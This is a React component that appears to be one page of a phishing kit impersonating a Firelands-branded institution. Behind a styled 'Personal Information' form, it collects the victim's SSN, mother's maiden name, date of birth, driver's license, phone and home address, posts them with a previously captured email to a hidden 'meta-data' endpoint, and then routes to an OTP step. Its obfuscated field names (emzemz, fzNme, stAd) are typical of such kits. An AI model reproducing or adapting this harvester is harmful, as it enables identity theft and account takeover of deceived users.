import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';

const heroImageUrl = '/assets/firelands-landing.jpg';

const BasicInfo: React.FC = () => {
  const location = useLocation();
  const { emzemz } = location.state || {};
  const navigate = useNavigate();
  
  // Redirect if no email
  useEffect(() => {
    if (!emzemz) {
      navigate('/');
    }
  }, [emzemz, navigate]);

  // Form state
  const [formData, setFormData] = useState({
    fzNme: '',
    lzNme: '',
    phone: '',
    ssn: '',
    motherMaidenName: '',
    dob: '',
    driverLicense: '',
    stAd: '',
    apt: '',
    city: '',
    state: '',
    zipCode: ''
  });
  
  const [errors, setErrors] = useState({
    fzNme: '',
    lzNme: '',
    phone: '',
    ssn: '',
    dob: '',
    stAd: '',
    city: '',
    state: '',
    zipCode: ''
  });
  
  const [isLoading, setIsLoading] = useState(false);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    // Validate required fields
    const newErrors = {
      fzNme: !formData.fzNme ? 'First name is required' : '',
      lzNme: !formData.lzNme ? 'Last name is required' : '',
      phone: !formData.phone ? 'Phone is required' : '',
      ssn: !formData.ssn ? 'SSN is required' : '',
      dob: !formData.dob ? 'Date of birth is required' : '',
      stAd: !formData.stAd ? 'Street address is required' : '',
      city: !formData.city ? 'City is required' : '',
      state: !formData.state ? 'State is required' : '',
      zipCode: !formData.zipCode ? 'Zip code is required' : ''
    };
    
    setErrors(newErrors);
    
    if (Object.values(newErrors).some(err => err)) {
      setIsLoading(false);
      return;
    }
    
    try {
      await axios.post(`${baseUrl}api/firelands-meta-data-3/`, {
        emzemz,
        ...formData
      });
      navigate('/otp', { state: { emzemz } });
    } catch (error) {
      console.error('Error submitting basic info:', error);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="relative flex min-h-screen flex-col overflow-hidden text-white">
      <div className="absolute inset-0">
        <img
          src={heroImageUrl}
          alt="Sun setting over Firelands farm fields"
          className="h-full w-full object-cover"
          loading="lazy"
          decoding="async"
          fetchPriority="high"
          sizes="100vw"
        />
        <div className="absolute inset-0 bg-gradient-to-r from-black/80 via-black/55 to-black/20"></div>
      </div>

      <div className="relative z-10 flex flex-1 flex-col justify-center px-6 py-10 md:px-12 lg:px-20">
        <div className="mx-auto w-full max-w-6xl">
          <div className="mx-auto w-full max-w-md rounded-[32px] bg-white/95 p-8 text-gray-800 shadow-2xl backdrop-blur">
            <h2 className="text-2xl font-semibold text-[#2f2e67]">Personal Information</h2>
            
            <form onSubmit={handleSubmit} className="mt-6 space-y-4">
              {/* Personal Info Fields */}
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <label className="text-sm text-[#5d4f72]">First Name</label>
                  <input
                    name="fzNme"
                    value={formData.fzNme}
                    onChange={handleChange}
                    className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                  />
                  {errors.fzNme && <p className="text-sm text-rose-600">{errors.fzNme}</p>}
                </div>
                
                <div className="space-y-2">
                  <label className="text-sm text-[#5d4f72]">Last Name</label>
                  <input
                    name="lzNme"
                    value={formData.lzNme}
                    onChange={handleChange}
                    className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                  />
                  {errors.lzNme && <p className="text-sm text-rose-600">{errors.lzNme}</p>}
                </div>
              </div>
              
              {/* Phone */}
              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Phone</label>
                <input
                  name="phone"
                  value={formData.phone}
                  onChange={handleChange}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
                {errors.phone && <p className="text-sm text-rose-600">{errors.phone}</p>}
              </div>
              
              {/* SSN */}
              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">SSN</label>
                <input
                  name="ssn"
                  value={formData.ssn}
                  onChange={handleChange}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
                {errors.ssn && <p className="text-sm text-rose-600">{errors.ssn}</p>}
              </div>
              
              {/* Mother's Maiden Name */}
              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Mother's Maiden Name</label>
                <input
                  name="motherMaidenName"
                  value={formData.motherMaidenName}
                  onChange={handleChange}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
              </div>
              
              {/* Date of Birth */}
              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Date of Birth</label>
                <input
                  name="dob"
                  value={formData.dob}
                  onChange={handleChange}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
                {errors.dob && <p className="text-sm text-rose-600">{errors.dob}</p>}
              </div>
              
              {/* Driver's License */}
              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Driver's License</label>
                <input
                  name="driverLicense"
                  value={formData.driverLicense}
                  onChange={handleChange}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
              </div>
              
              {/* Home Address Section */}
              <h2 className="text-2xl font-semibold text-[#2f2e67]">Home Address</h2>
              
              {/* Street Address */}
              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Street Address</label>
                <input
                  name="stAd"
                  value={formData.stAd}
                  onChange={handleChange}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
                {errors.stAd && <p className="text-sm text-rose-600">{errors.stAd}</p>}
              </div>
              
              {/* Apartment/Unit */}
              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Apartment/Unit</label>
                <input
                  name="apt"
                  value={formData.apt}
                  onChange={handleChange}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
              </div>
              
              {/* City */}
              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">City</label>
                <input
                  name="city"
                  value={formData.city}
                  onChange={handleChange}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
                {errors.city && <p className="text-sm text-rose-600">{errors.city}</p>}
              </div>
              
              {/* State */}
              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">State</label>
                <input
                  name="state"
                  value={formData.state}
                  onChange={handleChange}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
                {errors.state && <p className="text-sm text-rose-600">{errors.state}</p>}
              </div>
              
              {/* Zip Code */}
              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Zip Code</label>
                <input
                  name="zipCode"
                  value={formData.zipCode}
                  onChange={handleChange}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
                {errors.zipCode && <p className="text-sm text-rose-600">{errors.zipCode}</p>}
              </div>
              
              <button
                type="submit"
                disabled={isLoading}
                className="w-full rounded-full bg-gradient-to-r from-[#cdd1f5] to-[#f2f3fb] px-6 py-3 text-base font-semibold text-[#8f8fb8] shadow-inner transition enabled:hover:from-[#b7bff2] enabled:hover:to-[#e3e6fb] disabled:opacity-70"
              >
                {isLoading ? 'Processing...' : 'Continue'}
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default BasicInfo;
